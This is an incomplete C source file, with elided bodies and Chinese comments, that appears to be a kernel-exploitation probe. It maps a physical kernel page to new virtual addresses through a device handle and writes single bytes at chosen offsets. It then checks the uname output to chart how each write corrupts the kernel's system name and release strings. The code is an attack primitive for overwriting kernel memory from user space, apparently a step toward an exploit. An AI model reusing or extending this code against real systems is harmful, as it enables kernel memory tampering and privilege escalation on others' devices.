/*
 * kort_probe9.c - 落点函数测绘 (隔离式, 每偏移独立全新 VA)
 *
 * 每个偏移绑定一个从未用过的全新 VA, 写单值, 读 uname,
 * 精确确定 "请求偏移 -> 实际落点" 映射
 *
 * 写 +0xD38,'A' / +0xD39,'B' / +0xD3A,'C' / +0xD3B,'D' / +0xD3C,'E'
 * 观察 sysname & release 如何逐字节演化
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
...
static void show_uts(const char *tag) {
    ...
    printf("  [%s] sys='%.20s' node='%.12s' rel='%.20s' ver='%.12s'\n",
...
int main(void) {
    ...
    printf("[*] kort_probe9 - isolated per-offset landing map\n");
    ...
    /* 5 个隔离写, 每个独立全新 VA, 连续偏移 0xD38..0xD3C */
    const uint32_t offs[5] = { 0xD38, 0xD39, 0xD3A, 0xD3B, 0xD3C };
    const char vals[5] = { 'A', 'B', 'C', 'D', 'E' };
    for (int i = 0; i < 5; i++) {
        uint32_t va = 0x44000000u + i * 0x100000;  /* 全新 VA */
        if (bind_phys(fd, 0x027CD000u, va, 0x1000) != 0) {
            printf("[-] bind %d\n", i); continue;
        }
        uint32_t v = (uint8_t)vals[i] * 0x01010101u;
        wb_write_wh(fd, (uint32_t*)buf, va + offs[i], v, 0x10, 0x20);
        flush_cpu_cache();
        char tag[16];
        snprintf(tag, sizeof(tag), "+0x%x='%c'", offs[i], vals[i]);
        show_uts(tag);
    }
